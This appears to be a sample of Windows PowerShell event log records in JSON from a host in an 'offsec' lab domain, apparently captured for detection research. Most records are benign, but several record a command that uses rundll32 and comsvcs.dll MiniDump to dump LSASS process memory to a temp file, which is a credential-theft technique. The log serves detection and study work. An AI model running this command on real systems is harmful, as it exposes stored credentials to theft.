{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.255841Z"},"EventRecordID":1323,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Read-Host 'Press Enter to continue...' | Out-Null","ScriptBlockId":"8bda6354-51f2-4779-ac7b-603934bc393a"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.302720Z"},"EventRecordID":1324,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"$this.ServiceName","ScriptBlockId":"5336aa33-1fb7-4d40-bfbf-f0eb6d0c659f"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.302720Z"},"EventRecordID":1325,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"[System.Management.ManagementDateTimeConverter]::ToDateTime($args[0])","ScriptBlockId":"6183a262-7846-45f4-af7a-4622cd671790"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.302720Z"},"EventRecordID":1326,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"[System.Management.ManagementDateTimeConverter]::ToDmtfDateTime($args[0])","ScriptBlockId":"701d6e25-2203-4c4a-83b0-f3f656166317"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":40962,"Version":1,"Level":4,"Task":4,"Opcode":2,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.333968Z"},"EventRecordID":1327,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":3532},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":null}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.349591Z"},"EventRecordID":1328,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-76F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":1584},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id","ScriptBlockId":"4b8cd779-8c92-48a7-b407-8a119e38c45a"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":102,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.396470Z"},"EventRecordID":1329,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-79F7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":1584},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"@{\r\nGUID=\"EEFCB906-B326-4E99-9F54-8B4BB6EF3C6D\"\r\nAuthor=\"Microsoft Corporation\"\r\nCompanyName=\"Microsoft Corporation\"\r\nCopyright=\"© Microsoft Corporation. All rights reserved.\"\r\nModuleVersion=\"3.1.0.0\"\r\nPowerShellVersion=\"3.0\"\r\nCLRVersion=\"4.0\"\r\nNestedModules=\"Microsoft.PowerShell.Commands.Management.dll\"\r\nHelpInfoURI = 'http://go.microsoft.com/fwlink/?linkid=285756'\r\nCmdletsToExport=@(\"Add-Content\",\r\n    \"Clear-Content\",\r\n    \"Clear-ItemProperty\",\r\n    \"Join-Path\",\r\n    \"Convert-Path\",\r\n    \"Copy-ItemProperty\",\r\n    \"Get-EventLog\",\r\n    \"Clear-EventLog\",\r\n    \"Write-EventLog\",\r\n    \"Limit-EventLog\",\r\n    \"Show-EventLog\",\r\n    \"New-EventLog\",\r\n    \"Remove-EventLog\",\r\n    \"Get-ChildItem\",\r\n    \"Get-Content\",\r\n    \"Get-ItemProperty\",\r\n    \"Get-WmiObject\",\r\n    \"Invoke-WmiMethod\",\r\n    \"Move-ItemProperty\",\r\n    \"Get-Location\",\r\n    \"Set-Location\",\r\n    \"Push-Location\",\r\n    \"Pop-Location\",\r\n    \"New-PSDrive\",\r\n    \"Remove-PSDrive\",\r\n    \"Get-PSDrive\",\r\n    \"Get-Item\",\r\n    \"New-Item\",\r\n    \"Set-Item\",\r\n    \"Remove-Item\",\r\n    \"Move-Item\",\r\n    \"Rename-Item\",\r\n    \"Copy-Item\",\r\n    \"Clear-Item\",\r\n    \"Invoke-Item\",\r\n    \"Get-PSProvider\",\r\n    \"New-ItemProperty\",\r\n    \"Split-Path\",\r\n    \"Test-Path\",\r\n    \"Get-Process\",\r\n    \"Stop-Process\",\r\n    \"Wait-Process\",\r\n    \"Debug-Process\",\r\n    \"Start-Process\",\r\n    \"Remove-ItemProperty\",\r\n    \"Remove-WmiObject\",\r\n    \"Rename-ItemProperty\",\r\n    \"Register-WmiEvent\",\r\n    \"Resolve-Path\",\r\n    \"Get-Service\",\r\n    \"Stop-Service\",\r\n    \"Start-Service\",\r\n    \"Suspend-Service\",\r\n    \"Resume-Service\",\r\n    \"Restart-Service\",\r\n    \"Set-Service\",\r\n    \"New-Service\",\r\n    \"Set-Content\",\r\n    \"Set-ItemProperty\",\r\n    \"Set-WmiInstance\",\r\n    \"Get-Transaction\",\r\n    \"Start-Transaction\",\r\n    \"Complete-Transaction\",\r\n    \"Undo-Transaction\",\r\n    \"Use-Transaction\",\r\n    \"New-WebServiceProxy\",\r\n    \"Get-HotFix\",\r\n    \"Test-Connection\",\r\n    \"Enable-ComputerRestore\",\r\n    \"Disable-ComputerRestore\",\r\n    \"Checkpoint-Computer\",\r\n    \"Get-ComputerRestorePoint\",\r\n    \"Restart-Computer\",\r\n    \"Stop-Computer\",\r\n    \"Restore-Computer\",\r\n    \"Add-Computer\",\r\n    \"Remove-Computer\",\r\n    \"Test-ComputerSecureChannel\",\r\n    \"Reset-ComputerMachinePassword\",\r\n    \"Rename-Computer\",\r\n    \"Get-ControlPanelItem\",\r\n    \"Show-ControlPanelItem\")\r\n}\r\n","ScriptBlockId":"62c273e1-22da-44fc-a6c3-5cb365453815"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4103,"Version":1,"Level":4,"Task":106,"Opcode":20,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.427730Z"},"EventRecordID":1330,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0001-E190-86A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":1584},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 4.0\r\n        Host ID = 63c2be9c-cd2c-46d7-ac07-01a9e98f2400\r\n        Host Application = powershell.exe -NoP -C C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id\r\n        Engine Version = 4.0\r\n        Runspace ID = 1668d864-c13c-442c-bf70-3fe6a4dee2ca\r\n        Pipeline ID = 1\r\n        Command Name = Get-Process\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 16\r\n        User = OFFSEC\\admmig\r\n        Shell ID = Microsoft.PowerShell\r\n","UserData":"","Payload":"CommandInvocation(Get-Process): \"Get-Process\"\r\nParameterBinding(Get-Process): name=\"Name\"; value=\"lsass\"\r\n"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4103,"Version":1,"Level":4,"Task":106,"Opcode":20,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-20T14:39:26.427730Z"},"EventRecordID":1331,"Correlation_attributes":{"ActivityID":"A674BAE4-BF55-0000-7AF7-84A655BFD701"},"Execution_attributes":{"ProcessID":3268,"ThreadID":1584},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"FS03.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 4.0\r\n        Host ID = 63c2be9c-cd2c-46d7-ac07-01a9e98f2400\r\n        Host Application = powershell.exe -NoP -C C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id\r\n        Engine Version = 4.0\r\n        Runspace ID = 1668d864-c13c-442c-bf70-3fe6a4dee2ca\r\n        Pipeline ID = 1\r\n        Command Name = Get-Process\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 18\r\n        User = OFFSEC\\admmig\r\n        Shell ID = Microsoft.PowerShell\r\n","UserData":"","Payload":"CommandInvocation(Get-Process): \"Get-Process\"\r\nParameterBinding(Get-Process): name=\"Name\"; value=\"rundll32\"\r\n"}}}
